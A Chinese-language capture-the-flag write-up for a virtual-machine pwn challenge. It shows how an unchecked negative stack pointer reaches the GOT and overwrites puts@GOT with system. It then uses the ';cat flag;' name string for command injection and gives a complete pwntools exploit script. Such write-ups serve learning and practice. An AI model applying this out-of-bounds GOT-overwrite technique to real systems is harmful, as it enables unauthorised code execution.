# VM

## 题目简述

程序实现了一个定长 8 字节指令的简易虚拟机。一个指令在数值上的高位到低位依次为 `opcode`、`rgs1`、`rgs2`、`imm`，每段占 16 位；解析代码对寄存器字段只取低 8 位，对立即数取低 16 位。

字段布局可直接写成表格：

| 位范围 | 63～48 | 47～32 | 31～16 | 15～0 |
| --- | --- | --- | --- | --- |
| 字段 | `opcode` | `rgs1` | `rgs2` | `imm` |

VM 栈定义为 `size_t stack[0x100]`，但合法性检查只判断 `sp > 0x100`，没有拒绝负数。连续执行 `pop` 会让 `sp` 变为负值，从而把 `stack` 前方的 GOT 表当作虚拟机栈读写。

## 解题过程

相关指令语义为：

| opcode | 语义 |
| --- | --- |
| 1 | `rgs[rgs1] = stack[sp--]` |
| 3 | `rgs[rgs1] = rgs[rgs2] + imm` |
| 4 | `rgs[rgs1] -= rgs[rgs2]` |
| 7 | `rgs[rgs1] = rgs[rgs2] << imm` |
| 8 | `*(int *)&stack[++sp] = rgs[rgs1]` |

在给定 ELF 中，`puts@GOT` 位于 `stack[-18]`。从 `sp = 0` 开始，第 19 次 `pop` 读取的正是 `stack[-18]`，同时把 `sp` 变为 -19。最后执行 opcode 8 时先自增到 -18，再把修改后的 32 位值写回同一个 GOT 项。

程序在进入 VM 前已经调用过多次 `puts`，所以 GOT 中是解析后的 libc 地址。附件 libc 满足：

$$
puts-system=0x300e0=0x300e\ll4
$$

VM 的立即数只有 16 位，因此先生成 `0x300e`，左移 4 位后从泄露出的 `puts` 低 32 位中减去，得到 `system` 的低 32 位。opcode 8 只覆盖 GOT 的低 4 字节，高 4 字节仍来自同一 libc 映射，最终把 `puts@GOT` 改为 `system`。

`main` 最后执行：

```c
sprintf(Name, "Goodbye,%s,see you next time ~", name);
puts(Name);
```

将名字设置为 `;cat flag;` 后，劫持结果就是 `system("Goodbye,;cat flag;,see you next time ~")`。两侧无效命令会报错，但中间的 `cat flag` 会正常执行。

```python
from pwn import *

context.arch = "amd64"
elf = context.binary = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 10000)
io = remote(HOST, PORT)


def instruction(opcode: int, rgs1: int = 0,
                rgs2: int = 0, imm: int = 0) -> bytes:
    # 主机为小端序，因此发送顺序与数值字段的高低顺序相反。
    return p16(imm) + p16(rgs2) + p16(rgs1) + p16(opcode)


target_index = (elf.got.puts - elf.sym.stack) // 8
assert target_index == -18
pop_count = 1 - target_index

delta = libc.sym.puts - libc.sym.system
assert delta > 0 and delta % 16 == 0
delta_imm = delta >> 4
assert delta_imm <= 0xFFFF

payload = instruction(1, rgs1=1) * pop_count
payload += instruction(3, rgs1=2, rgs2=3, imm=delta_imm)
payload += instruction(7, rgs1=2, rgs2=2, imm=4)
payload += instruction(4, rgs1=1, rgs2=2)
payload += instruction(8, rgs1=1)

io.sendafter(b"What's your name?\n", b";cat flag;\x00")
io.sendafter(b"Input your opcode\n", payload)
io.interactive()
```

## 方法总结

本题的利用原语不是泛泛的“VM 可以改 GOT”，而是负 `sp` 造成的定向越界：先用 19 次 `pop` 读出 `puts@GOT` 的低 32 位，在 VM 内构造 `puts-system` 的偏移，再用半宽写回把 GOT 改成 `system`。复现时应从 ELF 和 libc 计算 `stack[-18]` 与 `0x300e0`，避免把原题脚本中的常量误当成普适值。
